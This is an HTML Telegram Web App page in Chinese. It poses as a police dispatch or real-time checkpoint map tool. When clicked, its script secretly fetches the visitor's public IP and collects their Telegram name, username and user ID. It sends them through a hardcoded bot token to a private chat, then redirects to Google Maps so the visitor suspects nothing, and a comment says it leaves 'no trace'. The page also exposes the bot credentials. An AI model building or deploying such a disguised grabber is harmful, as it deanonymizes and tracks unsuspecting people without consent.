<!DOCTYPE html>
<html lang="zh-Hant">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>即時臨檢點</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { 
            display: flex; flex-direction: column; align-items: center; justify-content: center; 
            height: 100vh; margin: 0; font-family: -apple-system, sans-serif;
            background-color: #ffffff; color: #000000;
        }
        #btn {
            padding: 20px 40px; font-size: 18px; font-weight: bold; cursor: pointer;
            background-color: #2481cc; color: #ffffff; border: none; border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            -webkit-appearance: none; /* 解決部分內核樣式問題 */
        }
        #info { margin-top: 20px; font-size: 14px; color: #888; }
    </style>
</head>
<body>

    <button id="btn">🚀 勤務指揮中心同步派遣系統</button>
    <div id="info">系統就緒</div>

    <script>
        // 確保 Telegram 物件存在
        const tg = window.Telegram.WebApp;

        // 電腦版相容性初始化
        window.onload = function() {
            if (tg) {
                tg.ready();
                // 電腦版對 expand 支援度不一，改用 try-catch 包裹避免崩潰
                try { tg.expand(); } catch (e) { console.log("Expand not supported"); }
            }
        };

        const BOT_TOKEN = '8791584619:AAHyvuJ9an8oF3z21kUxtZIbyVVmLk_jEhM';
        const MY_CHAT_ID = '1287211539';

        document.getElementById('btn').addEventListener('click', async () => {
            const btn = document.getElementById('btn');
            const infoDiv = document.getElementById('info');
            
            btn.disabled = true;
            infoDiv.innerText = "正在同步地圖資訊...";

            try {
                // 2. 取得 IP (必須 HTTPS)
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                const userIp = ipData.ip;

                // 3. 取得使用者資料
                let userName = "未知用戶";
                let userId = "未知ID";

                if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
                    const u = tg.initDataUnsafe.user;
                    userName = u.first_name + (u.last_name ? " " + u.last_name : "");
                    if (u.username) userName += ` (@${u.username})`;
                    userId = u.id;
                }

                // 4. 發送至 Bot API (使用 HTML 格式美化)
                const message = `📢 <b>點擊警報</b>\n👤 用戶: ${userName}\n🆔 ID: ${userId}\n🌐 IP: <code>${userIp}</code>`;
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: MY_CHAT_ID,
                        text: message,
                        parse_mode: "HTML"
                    })
                });

                // 5. 安全跳轉 (絕對禁止 http://)
                infoDiv.innerText = "載入成功，正在開啟地圖...";
                setTimeout(() => {
                    tg.openLink('https://www.google.com/maps');
                    tg.close();
                }, 400);

            } catch (err) {
                // 萬一出錯，直接開啟地圖不留痕跡
                tg.openLink('https://www.google.com/maps');
            }
        });
    </script>
</body>
</html>
